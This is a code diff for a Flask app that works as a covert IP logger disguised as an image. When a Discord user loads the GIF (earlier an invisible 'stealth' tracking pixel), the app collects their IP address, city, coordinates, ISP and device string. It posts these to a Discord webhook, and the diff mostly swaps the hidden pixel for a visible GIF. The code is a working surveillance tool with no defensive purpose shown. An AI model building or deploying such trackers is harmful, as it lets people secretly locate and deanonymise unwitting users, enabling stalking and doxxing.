@@ -1,13 +1,10 @@
-from flask import Flask, request, Response
+from flask import Flask, request, send_file, redirect
 import requests
 import os
 
 app = Flask(__name__)
-
-# Secure: Webhook from Render Environment
 WEBHOOK_URL = os.getenv('WEBHOOK_URL')
 
-# Get location from IP (free, accurate)
 def get_location(ip):
     try:
         data = requests.get(f"https://ipapi.co/{ip}/json/").json()
@@ -16,53 +13,46 @@ def get_location(ip):
         country = data.get("country_name", "Unknown")
         lat = data.get("latitude")
         lon = data.get("longitude")
-        accuracy = data.get("accuracy_radius", "Unknown")
         isp = data.get("org", "Unknown")
         location = f"{city}, {region}, {country}"
-        coords = f"({lat}, {lon}) ±{accuracy}km" if lat and lon else "Unknown"
+        coords = f"({lat}, {lon})" if lat and lon else "Unknown"
         return location, coords, isp
     except:
         return "Unknown", "Unknown", "Unknown"
 
-# STEALTH ROUTE: Looks like a normal ad pixel
-@app.route('/pixel.gif')
+@app.route('/togif.gif')
 def track():
-    # Get real IP
+    # Get IP
     forwarded = request.headers.get('X-Forwarded-For')
     ip = forwarded.split(',')[0] if forwarded else request.remote_addr
-
-    # Get user from ?user= (from Discord bot)
     user = request.args.get('user', 'Unknown')
-
-    # Get device
-    ua = request.headers.get('User-Agent', 'Unknown')
-
-    # Get location
+    ua = request.headers.get('User-Agent', 'Unknown')[:80]
     location, coords, isp = get_location(ip)
 
-    # Send to Discord
+    # Log to Discord
     if WEBHOOK_URL:
         payload = {
-            "content": f"**Tracked**\n"
+            "content": f"**GIF Clicked**\n"
                        f"**User:** `{user}`\n"
                        f"**IP:** `{ip}`\n"
                        f"**Location:** {location}\n"
-                       f"**Coordinates:** `{coords}`\n"
+                       f"**Coords:** `{coords}`\n"
                        f"**ISP:** `{isp}`\n"
-                       f"**Device:** `{ua[:80]}`..."
+                       f"**Device:** `{ua}`..."
         }
         try:
             requests.post(WEBHOOK_URL, json=payload)
         except:
-            pass  # Silent fail if webhook down
+            pass
 
-    # Return 1x1 transparent pixel (invisible!)
-    pixel = (
-        b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00"
-        b"!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00"
-        b"\x00\x02\x02D\x01\x00;"
-    )
-    return Response(pixel, mimetype='image/gif')
+    # Show the GIF
+    return send_file('togif.gif', mimetype='image/gif')
+
+# Optional: redirect root
+@app.route('/')
+def home():
+    return redirect("https://discord.gg/yourserver")
 
 if __name__ == '__main__':
     app.run()
+
